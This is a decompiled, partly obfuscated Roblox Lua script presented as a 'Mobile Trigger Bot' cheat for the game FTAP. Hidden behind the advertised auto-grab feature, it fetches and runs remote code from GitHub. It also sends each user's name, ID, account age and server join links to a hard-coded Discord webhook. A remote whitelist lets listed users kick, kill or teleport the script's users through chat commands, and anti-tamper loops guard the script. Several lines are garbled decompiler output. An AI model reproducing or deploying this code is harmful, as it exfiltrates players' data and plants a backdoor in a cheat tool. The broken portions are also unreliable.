local enable9 = true
local gmatch = string.gmatch

local function function1(...)
    error("Tamper Detected!")
    return 
end

local enable11 = false
local v41 = pcall(function(...)
    enable11 = true
    return 
end)
local v422 = v41
if v41 then
    local v40 = enable11
end
local v39 = 1
local random = math.random
local concat = table.concat

local function function27(...)
    while true do
        local v12 = l2
        local v22 = v12
        function1() 
    end
    return 
end

local function26 = table and table.unpack or unpack
local v38 = random(3, 65)
local tbl45 = {
    pcall(function(...)
        return "AzKIeLQJ9" / (10606678 - "h7bfU" ^ 10976175) 
    end)
}
local tbl41 = tbl45[2]
local v37 = tonumber(gmatch(tostring(tbl41), ":(%d*):")())
for index5 = 1, v38 do
    local v33 = index5
    local randomNum = math.random(1, 100)
    local v34 = random(0, 255)
    local v35 = random(1, randomNum)
    local enable10 = random(1, 2) == 1
    local v36 = tbl41.gsub(tbl41, ":(%d*):", ":" .. tostring(random(0, 10000)) .. ":")
    local tbl43 = {
        pcall(function(...)
            if random(1, 2) == 1 or v33 == v38 then
                enable9 = enable9 and v37 == tonumber(gmatch(tostring(({
                    pcall(function(...)
                        return "1iIbL1yh4NHPVL" / (757941 - "BaE25FvRwgnGYF" ^ 10165016) 
                    end)
                })[2]), ":(%d*):")())
            end
            if enable10 then
                error(v36, 0)
            end
            local tbl42 = {}
            for index6 = 1, randomNum do
                tbl42[index6] = random(0, 255) 
            end
            tbl42[v35] = v34
            return function26(tbl42) 
        end)
    }
    if enable10 then
        enable9 = enable9 and (pcall(function(...)
            if random(1, 2) == 1 or v33 == v38 then
                enable9 = enable9 and v37 == tonumber(gmatch(tostring(({
                    pcall(function(...)
                        return "1iIbL1yh4NHPVL" / (757941 - "BaE25FvRwgnGYF" ^ 10165016) 
                    end)
                })[2]), ":(%d*):")())
            end
            if enable10 then
                error(v36, 0)
            end
            local tbl44 = {}
            for index7 = 1, randomNum do
                tbl44[index7] = random(0, 255) 
            end
            tbl44[v35] = v34
            return function26(tbl44) 
        end) == false and tbl43[2] == v36)
    end 
end
enable9 = enable9 and 0 == 0
if enable9 then
    local floor = math.floor
    local v32 = 0
    local v42 = 2
    local tbl = {}
    local tbl2 = {}
    for index = 1, 256 do
        tbl[index] = index 
    end
    local enable1 = #tbl == 0
    local removedVal = table.remove(tbl, math.random(1, #tbl))
    tbl2[removedVal] = string.char(removedVal - 1)
    if #tbl == 0 then
        local v52 = {}
        local v62 = {}
        local tbl3 = setmetatable({}, { ["__index"] = v62, ["__metatable"] = nil })
        local GAME = GAME
        loadstring(GAME.HttpGet(GAME, "https://raw.githubusercontent.com/GoofedLord/Ui/refs/heads/main/Repobackup"))()
        local GAME = GAME
        local players = GAME.GetService(GAME, "Players")
        local GAME = GAME
        local runService = GAME.GetService(GAME, "RunService")
        GAME = GAME
        local inputService = GAME.GetService(GAME, "UserInputService")
        local GAME2 = GAME
        local repStorage = GAME2.GetService(GAME2, "ReplicatedStorage")
        local GAME3 = GAME
        local workspace = GAME3.GetService(GAME3, "Workspace")
        local GAME4 = GAME
        local contextAction = GAME4.GetService(GAME4, "ContextActionService")
        local GAME5 = GAME
        local httpService = GAME5.GetService(GAME5, "HttpService")
        local GAME6 = GAME
        local textChatServiceService = GAME6.GetService(GAME6, "TextChatService")
        local localPlayer = players.LocalPlayer
        local camera = workspace.CurrentCamera
        local v72 = "https://discord.com/api/webhooks/1451728531682758689/grfvX9l4XWYFwsLFiCQmX_Y4a9PxXRgUYydD7Mds2ShhNQ8yCeUAwLcHlfV0OE7cPG3Y"
        task.spawn(function(...)
            GAME2 = {
                pcall(function(...)
                    return GAME.JobId 
                end)
            }
            local tbl4 = pcall(function(...)
                return GAME.JobId 
            end)
            local v82 = tbl4[2]
            tbl4 = GAME.PlaceId
            if v82 then
                local tbl5 = players
                local v92 = "N/A"
                pcall(function(...)
                    local tbl6 = localPlayer
                    local v10 = tostring(math.floor(tbl6.GetNetworkPing(tbl6) * 1000)) .. "ms"
                    return 
                end)
                local tbl7 = httpService
                local v11 = tbl7.JSONEncode(tbl7, {
                    ["username"] = "Script Logger",
                    ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=420&height=420&format=png",
                    ["embeds"] = {
                        {
                            ["title"] = "\xf0\x9f\x8e\xae Script Executed",
                            ["description"] = "Someone loaded your script!",
                            ["color"] = 16727100,
                            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                            ["fields"] = {
                                {
                                    ["name"] = "\xf0\x9f\x91\xa4 Player Info",
                                    ["value"] = "**Username:** " .. localPlayer.Name .. "\n**Display Name:** " .. localPlayer.DisplayName .. "\n**User ID:** " .. tostring(localPlayer.UserId) .. "\n**Account Age:** " .. tostring(localPlayer.AccountAge) .. " days",
                                    ["inline"] = false
                                },
                                {
                                    ["name"] = "\xf0\x9f\x96\xa5\xef\xb8\x8f Server Info",
                                    ["value"] = "**Place ID:** " .. tostring(tbl4) .. "\n**Job ID:** `" .. tostring(tbl5) .. "`\n**Players:** " .. tostring(#tbl5.GetPlayers(tbl5)) .. "/" .. tostring(players.MaxPlayers or "?") .. "\n**Ping:** " .. v92,
                                    ["inline"] = false
                                },
                                {
                                    ["name"] = "\xf0\x9f\x94\x97 Join Links",
                                    ["value"] = "[Roblox Protocol](" .. ("roblox://placeId=" .. tostring(tbl4) .. "&gameInstanceId=" .. tostring(tbl5)) .. ") | [Web Browser](" .. ("https://www.roblox.com/games/start?placeId=" .. tostring(tbl4) .. "&launchData=%7B%22gameInstanceId%22%3A%22" .. tostring(tbl5) .. "%22%7D") .. ")",
                                    ["inline"] = false
                                }
                            },
                            ["footer"] = { ["text"] = "Obsidian Script Logger" }
                        }
                    }
                })
                pcall(function(...)
                    request({
                        ["Url"] = v72,
                        ["Method"] = "POST",
                        ["Headers"] = { ["Content-Type"] = "application/json" },
                        ["Body"] = v11
                    })
                    return 
                end)
                pcall(function(...)
                    local tbl8 = httpService
                    tbl8.PostAsync(tbl8, v72, v11, Enum.HttpContentType.ApplicationJson)
                    return 
                end)
                return
            else
                local v122 = "Unknown"
            end 
        end)
        local v13 = {}
        local enable2 = false
        task.spawn(function(...)
            GAME2 = {
                pcall(function(...)
                    local GAME7 = GAME
                    return GAME7.HttpGet(GAME7, "https://raw.githubusercontent.com/Bruhiscrazy/Obsidian-/refs/heads/main/Whitelist") 
                end)
            }
            local tbl9 = pcall(function(...)
                local GAME8 = GAME
                return GAME8.HttpGet(GAME8, "https://raw.githubusercontent.com/Bruhiscrazy/Obsidian-/refs/heads/main/Whitelist") 
            end)
            local v14 = tbl9[2]
            if tbl9 then
                local v15 = v14
            end
            if tbl9 then
                local pcall = pcall
                local tbl11 = {
                    pcall(function(...)
                        local tbl10 = q[pcall]
                        return tbl10.JSONDecode(tbl10, v14) 
                    end)
                }
                local v16 = tbl11[2]
                local tbl13 = pcall(function(...)
                    local tbl12 = q[pcall]
                    return tbl12.JSONDecode(tbl12, v14) 
                end)
                if tbl13 then
                    tbl13 = typeof(v16) == "table"
                end
                if tbl13 then
                    pcall = tbl13[2]
                    v13 = pcall
                    enable2 = true
                end
            end
            return 
        end)
        
        local function function3(function2, ...)
            if not enable2 then
                return false
            end
            return table.find(v13, function2.UserId) ~= nil 
        end
        
        local function function5(function4, ...)
            local v17 = function4
            local enable3 = textChatServiceService.ChatVersion == Enum.ChatVersion.TextChatService
            if enable3 then
                enable3 = textChatServiceService
                local tbl14 = enable3.FindFirstChild(enable3, "TextChannels")
                if tbl14 then
                    tbl14 = tbl14.FindFirstChild(tbl14, "RBXGeneral")
                    if tbl14 then
                        tbl14.SendAsync(tbl14, function4)
                    end
                end
            else
                enable3 = repStorage
                local tbl15 = enable3.FindFirstChild(enable3, "DefaultChatSystemChatEvents")
                if tbl15 then
                    local v18 = tbl15.FindFirstChild(tbl15, "SayMessageRequest")
                end
                if tbl15 then
                    enable3 = tbl15.SayMessageRequest
                    enable3.FireServer(enable3, function4, "All")
                end
                return
            end 
        end
        
        local function function7(function6, ...)
            local tbl16 = function6
            tbl16 = tbl16.lower(tbl16)
            local tbl17 = players
            GAME4 = { tbl17.GetPlayers(tbl17) }
            local tbl18 = tbl17[3]
            for v19, index2 in tbl18[1], ipairs(S(GAME4)) do
                GAME6 = index2.Name
                index2 = GAME6.lower(GAME6)
                tbl16.lower(tbl16)
                if index2.find(index2, tbl16) or index2.find(index2, tbl16) then
                    return index2
                end 
            end
            return nil 
        end
        
        local function function10(function9, function8, ...)
            local element = function8
            if not function3(function9) then return end
            if element.sub(element, 1, 1) ~= ":" then return end
            element = {}
            local func = element.sub(element, 2)
            element = { func.gmatch(func, "%S+") }
            GAME4 = func.gmatch(func, "%S+")
            local v20 = GAME4(element[2], element[3])
            while v20 do
                element = v20
                table.insert(element, element) 
            end
            element = element[1]
            func = func
            if element then
                table.remove(element, 1)
                if (element and element.lower(element)) == "r" then
                    function5("Trigger")
                else
                    if (v20 and element.lower(element)) == "b" and table.concat(element, " ") ~= "" then
                        GAME4 = function7(table.concat(element, " "))
                        if GAME4 then
                            element = GAME4 ~= function9
                        end
                        if GAME4 then
                            func = tbl3
                            if GAME4.Character and func.FindFirstChild(func, "HumanoidRootPart") then
                                func(v20).Character.HumanoidRootPart.CFrame = function9.Character.HumanoidRootPart.CFrame + Vector3.new(3, 0, 3)
                            end
                        end
                    else
                        if (v20 and element.lower(element)) == "re" and table.concat(element, " ") ~= "" then
                            GAME4 = function7(table.concat(element, " "))
                            if GAME4 then
                                element = GAME4 ~= function9
                            end
                            if GAME4 then
                                GAME6 = GAME4.Character
                                if GAME6 then
                                    GAME6 = func(v20).Character
                                    element = GAME6.FindFirstChildOfClass(GAME6, "Humanoid")
                                end
                                if GAME6 then
                                    func(v20).Character.Humanoid.Health = 0
                                end
                            end
                        else
                            if (v20 and element.lower(element)) == "k" and table.concat(element, " ") ~= "" then
                                local v21 = function7(table.concat(element, " "))
                                if v21 and v21 ~= function9 then
                                    pcall(function(...)
                                        func = v21
                                        func.Kick(func, "Kicked by admin")
                                        return 
                                    end)
                                end
                            end
                            return
                        end
                    end
                end
            else
                local v222 = ""
            end 
        end
        
        local v23 = r15("\xa7\x93\xedE\x94\xed\x82{E@\x1a\xaf\xe9\xb5<", 27583023051308)
        local enable4 = textChatServiceService.ChatVersion == Enum.ChatVersion[tbl3[v23]]
        if enable4 then
            enable4 = textChatServiceService
            local v24 = enable4.FindFirstChild(enable4, "TextChannels")
            if v24 then
                local tbl19 = "RBXGeneral"
                enable4 = tbl19.FindFirstChild(tbl19, tbl19)
                if enable4 then
                    tbl19 = enable4.MessageReceived
                    tbl19.Connect(tbl19, function(function11, ...)
                        local tbl20 = function11.TextSource
                        if tbl20 then
                            tbl20 = players
                            tbl19 = tbl20.GetPlayerByUserId(tbl20, tbl20.UserId)
                            if tbl19 then
                                function10(tbl19, function11.Text)
                            end
                        end
                        return 
                    end)
                end
            end
        else
            local tbl21 = players
            local tbl22 = { tbl21.GetPlayers(tbl21) }
            local tbl23 = tbl21[1]
            local v25 = tbl21[2]
            for v26, index3 in ipairs(S(tbl22)) do
                local tbl24 = index3
                local tbl25 = tbl24.Chatted
                tbl25.Connect(tbl25, function(function12, ...)
                    function10(tbl24, function12)
                    return 
                end) 
            end
            enable4 = players.PlayerAdded
            enable4.Connect(enable4, function(function13, ...)
                local tbl26 = function13
                local tbl27 = tbl26.Chatted
                tbl27.Connect(tbl27, function(function14, ...)
                    function10(tbl26, function14)
                    return 
                end)
                return 
            end)
            local GAME9 = GAME
            local tbl28 = loadstring(GAME9.HttpGet(GAME9, "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/" .. "Library.lua"))()
            tbl28.Scheme.BackgroundColor = Color3.fromRGB(45, 10, 10)
            tbl28.Scheme.MainColor = Color3.fromRGB(65, 15, 15)
            tbl28.Scheme.AccentColor = Color3.fromRGB(255, 60, 60)
            tbl28.Scheme.OutlineColor = Color3.fromRGB(120, 40, 40)
            tbl28.Scheme.FontColor = Color3.fromRGB(255, 220, 220)
            tbl28.Scheme.RedColor = Color3.fromRGB(255, 80, 80)
            tbl28.Scheme.DestructiveColor = Color3.fromRGB(180, 30, 30)
            tbl28.Scheme.DarkColor = Color3.fromRGB(20, 5, 5)
            tbl28.Scheme.WhiteColor = Color3.fromRGB(255, 240, 240)
            local tbl29 = tbl28
            tbl29.UpdateColorsUsingRegistry(tbl29)
            tbl29 = tbl28
            GAME9 = tbl29.CreateWindow(tbl29, {
                ["Title"] = "Mobile Trigger Bot",
                ["Footer"] = "made by someone",
                ["ToggleKeybind"] = Enum.KeyCode.RightShift,
                ["Size"] = UDim2.fromOffset(450, 380),
                ["Acrylic"] = false,
                ["NotifySide"] = "Right",
                ["ShowCustomCursor"] = true
            })
            tbl29 = GAME9.AddTab(GAME9, "Trigger", "rbxassetid://10709751830")
            local tbl30 = GAME9.AddTab(GAME9, "Discord", "rbxassetid://10747383819")
            local v27 = "https://discord.gg/YFtzwDhxhQ"
            local tbl31 = tbl30.AddLeftGroupbox(tbl30, "Community")
            tbl31.AddLabel(tbl31, "Join the Discord to meet other players")
            tbl31.AddLabel(tbl31, "or friends to play with in FTAP")
            tbl31.AddLabel(tbl31, "and get ranked!")
            tbl23 = tbl30.AddRightGroupbox(tbl30, "Invite Link")
            tbl23.AddButton(tbl23, "Join Discord", function(...)
                local enable5 = false
                pcall(function(...)
                    if setclipboard then
                        setclipboard(v27)
                        local enable6 = true
                    end
                    return 
                end)
                if not enable5 then
                    pcall(function(...)
                        if syn and syn.write_clipboard then
                            syn.write_clipboard(v27)
                            local enable7 = true
                        end
                        return 
                    end)
                end
                if not enable5 then
                    pcall(function(...)
                        if clipboard and clipboard.set then
                            clipboard.set(v27)
                            local enable8 = true
                        end
                        return 
                    end)
                end
                local tbl32 = enable5
                if tbl32 then
                    tbl32 = tbl28
                    tbl32.Notify(tbl32, "Discord invite link copied to clipboard!", 3)
                else
                    tbl32 = tbl28
                    tbl32.Notify(tbl32, "Could not copy automatically. Link: " .. v27, 5)
                end
                return 
            end)
            tbl23.AddLabel(tbl23, "Click the button above to copy")
            tbl23.AddLabel(tbl23, "the Discord invite link.")
            local tbl33 = {
                ["Enabled"] = false,
                ["Connection"] = nil,
                ["canGrab"] = true,
                ["maxDistance"] = 20,
                ["preGrabDelay"] = 1e-05,
                ["postGrabDelay"] = .05,
                ["lastTarget"] = nil,
                ["lastHitTime"] = 0,
                ["targetMemoryDuration"] = .1,
                ["checkThrottle"] = .008,
                ["lastCheck"] = 0,
                ["cooldown"] = .8,
                ["lastReleaseTime"] = 0
            }
            local tbl34 = RaycastParams.new()
            tbl34.FilterType = Enum.RaycastFilterType.Exclude
            task.spawn(function(...)
                tbl21 = {
                    pcall(function(...)
                        local tbl35 = repStorage.GamepassEvents.CheckForGamepass
                        return tbl35.InvokeServer(tbl35, 20837132) 
                    end)
                }
                local tbl37 = pcall(function(...)
                    local tbl36 = repStorage.GamepassEvents.CheckForGamepass
                    return tbl36.InvokeServer(tbl36, 20837132) 
                end)
                if tbl37 then local v28 = tbl37[2] end
                if tbl37 then
                    tbl33.maxDistance = 29.3
                end
                return 
            end)
            local tbl38 = repStorage
            tbl21 = tbl38.FindFirstChild(tbl38, "GamepassEvents") and tbl38.FindFirstChild(tbl38, "FurtherReachBoughtNotifier")
            local func2 = q[F]
            if tbl21 then
                tbl21 = repStorage.GamepassEvents.FurtherReachBoughtNotifier.OnClientEvent
                tbl21.Connect(tbl21, function(...)
                    tbl33.maxDistance = 29.3
                    return 
                end)
            end
            tbl33.GetTarget = function(function15, ...)
                F = localPlayer.Character
                if not F or not F.FindFirstChild(F, "HumanoidRootPart") then
                    return nil
                end
                func2 = workspace
                if func2.FindFirstChild(func2, "GrabParts") then
                    return nil
                end
                s = camera.CFrame.LookVector
                tbl23 = tbl3
                tbl34.FilterDescendantsInstances = { F, workspace.Terrain }
                func2 = workspace
                tbl22 = func2.Raycast(func2, camera.CFrame.Position, s * 1000, tbl34)
                if not tbl22 then
                    tbl23 = tbl3
                    func2 = ipairs
                    GAME9 = tbl23[3]
                    tbl23 = tbl23[1]
                    for v29, index4 in tbl23, func2({
                        s,
                        (s + Vector3.new(0, .075, 0)).Unit,
                        (s - Vector3.new(0, .075, 0)).Unit
                    }) do
                        func2 = workspace
                        tbl22 = func2.Raycast(func2, camera.CFrame.Position, index4 * 1000, tbl34)
                        if tbl22 then
                            
                        end 
                    end
                end
                if not tbl22 then
                    return nil
                end
                tbl23 = tbl22.Instance
                tbl21 = tbl23.FindFirstAncestorOfClass(tbl23, "Model")
                if not tbl21 or (not tbl21.FindFirstChildOfClass(tbl21, "Humanoid") or tbl21 == F) then
                    return nil
                end
                if tbl21.FindFirstChildOfClass(tbl21, "Humanoid").Health <= 0 then
                    return nil
                end
                tbl23 = tbl21.FindFirstChild(tbl21, "HumanoidRootPart")
                if not tbl23 then
                    return nil
                end
                if (F.HumanoidRootPart.Position - tbl23.Position).Magnitude > function15.maxDistance then
                    return nil
                end
                return tbl21 
            end
            
            local function function16(...)
                pcall(function(...)
                    func2 = contextAction
                    func2.CallFunction(func2, "Grab", Enum.UserInputState.Begin, nil)
                    return 
                end)
                task.wait(.05)
                pcall(function(...)
                    func2 = contextAction
                    func2.CallFunction(func2, "Grab", Enum.UserInputState.End, nil)
                    return 
                end)
                return 
            end
            
            tbl33.OnHeartbeat = function(function17, ...)
                r53 = function17
                if not r53.Enabled or not r53.canGrab then return end
                func2 = inputService
                if func2.GetFocusedTextBox(func2) then return end
                if tick() - r53.lastCheck < r53.checkThrottle then return end
                r53.lastCheck = tick()
                tbl22 = workspace
                if not tbl22.FindFirstChild(tbl22, "GrabParts") then
                    if tick() - r53.lastReleaseTime < r53.cooldown then return end
                end
                func2 = r53
                F = func2.GetTarget(func2)
                if F then
                    tbl21 = tbl22
                    r53.lastTarget = tbl21
                    r53.lastHitTime = tick()
                else
                    if r53.lastTarget and tick() - r53.lastHitTime > r53.targetMemoryDuration then
                        r53.lastTarget = nil
                    end
                    func2 = localPlayer.Character
                    tbl21 = r53.lastTarget
                    s = r53.lastTarget
                    if s then
                        s = r53.lastTarget
                        tbl22 = s.FindFirstChild(s, "HumanoidRootPart")
                    end
                    tbl22 = not tbl22
                    s = s
                    tbl23 = r53.lastTarget
                    tbl22 = "Magnitude"
                    if tbl23 then
                        if tbl21 then
                            GAME9 = func2.FindFirstChild(func2, "HumanoidRootPart")
                            tbl23 = GAME9 and 
                            func2 = localPlayer.Character
                        end
                        func2 = localPlayer.Character
                    end
                    func2 = tbl22
                    if not tbl22 then return end
                    if (tbl21.HumanoidRootPart.Position - s.Position).Magnitude > r53.maxDistance then
                        r53.lastTarget = nil
                        return
                    end
                    if r53.lastTarget then
                        r53.canGrab = false
                        task.spawn(function(...)
                            task.wait(r53.preGrabDelay)
                            function16()
                            tbl21 = workspace
                            p = tick()
                            F = not tbl21.FindFirstChild(tbl21, "GrabParts")
                            if F then
                                task.wait(.02)
                                tbl21 = workspace
                                if not tbl21.FindFirstChild(tbl21, "GrabParts") or tick() - p > 1.6 then
                                    r53.lastReleaseTime = tick()
                                    task.wait(r53.postGrabDelay)
                                    r53.canGrab = true
                                    r53.lastTarget = nil
                                    return
                                end
                            else
                                tbl22 = tick() - p > 1.6
                            end 
                        end)
                    end
                    return
                end 
            end
            tbl22 = tbl29.AddLeftGroupbox(tbl29, "Trigger Bot")
            tbl38 = tbl29.AddRightGroupbox(tbl29, "Status")
            local v30 = tbl38.AddLabel(tbl38, "Status: Disabled")
            local v31 = tbl38.AddLabel(tbl38, "Cooldown: 0.55s (after release)")
            tbl22.AddToggle(tbl22, "EnableTriggerBot", {
                ["Text"] = "Enable Trigger Bot",
                ["Default"] = false,
                ["Tooltip"] = "Toggle trigger bot on/off",
                ["Callback"] = function(function18, ...)
                    func2 = tbl33
                    local tbl39 = function18
                    func2.Enabled = tbl39
                    if false and not nil then
                        tbl39 = runService.Heartbeat
                        tbl33.Connection = tbl39.Connect(tbl39, function(...)
                            func2 = tbl33
                            func2.OnHeartbeat(func2)
                            return 
                        end)
                        func2 = v30
                        func2.SetText(func2, "Status: Active")
                    else
                        if not false and nil then
                            func2 = nil
                            func2.Disconnect(func2)
                            tbl33.Connection = nil
                            func2 = v30
                            func2.SetText(func2, "Status: Disabled")
                        end
                        return
                    end 
                end
            })
            tbl22.AddSlider(tbl22, "MaxDistance", {
                ["Text"] = "Max Distance",
                ["Default"] = 29.3,
                ["Min"] = 10,
                ["Max"] = 30,
                ["Rounding"] = 1,
                ["Tooltip"] = "Maximum grab range",
                ["Callback"] = function(function19, ...)
                    tbl33.maxDistance = function19
                    return 
                end
            })
            tbl22.AddSlider(tbl22, "PreGrabDelay", {
                ["Text"] = "Pre Grab Delay",
                ["Default"] = 1e-05,
                ["Min"] = 0,
                ["Max"] = 0.5,
                ["Rounding"] = 5,
                ["Tooltip"] = "Delay before grab (prediction)",
                ["Callback"] = function(function20, ...)
                    tbl33.preGrabDelay = function20
                    return 
                end
            })
            tbl22.AddSlider(tbl22, "PostGrabDelay", {
                ["Text"] = "Post Grab Delay",
                ["Default"] = .05,
                ["Min"] = 0,
                ["Max"] = 0.5,
                ["Rounding"] = 2,
                ["Tooltip"] = "Delay after grab release",
                ["Callback"] = function(function21, ...)
                    tbl33.postGrabDelay = function21
                    return 
                end
            })
            tbl22.AddSlider(tbl22, "TargetMemory", {
                ["Text"] = "Target Memory",
                ["Default"] = .1,
                ["Min"] = 0,
                ["Max"] = 1,
                ["Rounding"] = 2,
                ["Tooltip"] = "How long to remember target after losing sight",
                ["Callback"] = function(function22, ...)
                    tbl33.targetMemoryDuration = function22
                    return 
                end
            })
            tbl22.AddSlider(tbl22, "CheckThrottle", {
                ["Text"] = "Check Throttle",
                ["Default"] = .008,
                ["Min"] = .001,
                ["Max"] = .1,
                ["Rounding"] = 3,
                ["Tooltip"] = "Time between target checks",
                ["Callback"] = function(function23, ...)
                    tbl33.checkThrottle = function23
                    return 
                end
            })
            tbl22.AddSlider(tbl22, "Cooldown", {
                ["Text"] = "Cooldown",
                ["Default"] = .55,
                ["Min"] = .1,
                ["Max"] = 3,
                ["Rounding"] = 2,
                ["Tooltip"] = "Seconds between grabs (starts after release)",
                ["Callback"] = function(function24, ...)
                    local v322 = function24
                    tbl33.cooldown = v322
                    func2 = v31
                    func2.SetText(func2, "Cooldown: " .. tostring(v322) .. "s (after release)")
                    return 
                end
            })
            tbl38.AddLabel(tbl38, "Pc but mobile")
            tbl38.AddLabel(tbl38, "Dont mess with with the other stuff")
            tbl38.AddLabel(tbl38, "Only use cooldown")
            tbl38.AddLabel(tbl38, "Mobile fps are bad ")
            tbl38.AddLabel(tbl38, "wont grab correctly due to 60fps")
            tbl29 = localPlayer.CharacterAdded
            tbl29.Connect(tbl29, function(function25, ...)
                local tbl40 = function25
                func2 = tbl40.WaitForChild(tbl40, "Humanoid").Died
                func2.Connect(func2, function(...)
                    func2 = false
                    if func2 then
                        tbl33.canGrab = true
                        tbl33.lastTarget = nil
                        tbl33.lastReleaseTime = 0
                        func2 = v30
                        func2.SetText(func2, "Status: Died - Reset")
                    end
                    return 
                end)
                return 
            end)
            tbl29 = tbl28
            tbl29.Toggle(tbl29, true)
            return
        end
    end
end
return (function(...)
    while true do
        local v12 = l2
        local v22 = v12
        function1() 
    end
    return 
end)()